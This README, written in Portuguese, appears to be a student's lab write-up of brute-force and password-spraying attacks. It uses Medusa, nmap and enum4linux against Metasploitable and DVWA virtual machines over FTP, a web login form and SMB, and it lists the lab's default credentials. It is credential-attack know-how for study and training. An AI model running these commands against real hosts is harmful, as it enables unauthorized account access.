# Solução — Desafio Cyber Test (Kali + Medusa)

> **Aviso de Ética:** todos os testes foram realizados apenas em VMs locais e autorizadas (Kali + Metasploitable/DVWA). Não execute esses procedimentos em hosts/rede sem permissão.

---

## Fluxo executado (resumo)
Varredura → criação de wordlists → ataques com Medusa (FTP, FORM/DVWA, SMB) → validação de acessos.

---

## 1) FTP — Força Bruta com Medusa

**Varredura (Nmap):**
```bash
nmap -sV -p 20,21 192.168.56.102
```

**Wordlists usadas:**
- `users.txt`
- `password.txt`

**Ataque (Medusa):**
```bash
medusa -h 192.168.56.102 -U users.txt -P password.txt -M ftp -t 6
```

**Validação (login manual):**
```text
ftp 192.168.56.102
# user: msfadmin
# senha: msfadmin
# usar 'ls' para confirmar listagem
```

---

## 2) DVWA (Web) — Ataque a formulário (FORM)

**Comando (Medusa FORM):**
```bash
medusa -h 192.168.56.102 -U users.txt -P password.txt \
 -M http -m FORM:POST:/dvwa/login.php \
 -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
 -m FAIL:"Login failed" \
 -T 10 -t 5
```

**Validação (login manual):**
```text
# Abrir o DVWA no navegador (ex.: `http://192.168.56.102/dvwa/login.php`).
# user: admin
# senha: password
```
---

## 3) SMB — Enumeração e Password Spraying

**Varredura e enumeração:**
```bash
nmap -v -p 445 192.168.56.102
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```

**Ataque (Medusa — SMB):**
```bash
medusa -h 192.168.56.102 -U users.txt -P password.txt -M smbnt -t 2 -T 50
```

**Validação (listar shares / conectar):**
```bash
smbclient -L //192.168.56.102 -U msfadmin
```

---

## Observações rápidas de segurança e ética

* Testes realizados apenas em VMs autorizadas.  

---

## O que eu aprendi

Este desafio me ajudou a entender, na prática, o fluxo completo de auditoria de autenticação: **identificar serviços**, **criar/usar wordlists**, **executar ataques automatizados com Medusa**, e **validar acessos** de forma controlada — além de reforçar a importância de mitigação (lockout, MFA, monitoramento) e da responsabilidade ética em testes de segurança.

---

*Arquivo gerado para publicação pública: README resumido com soluções diretas e evidências redigidas.*
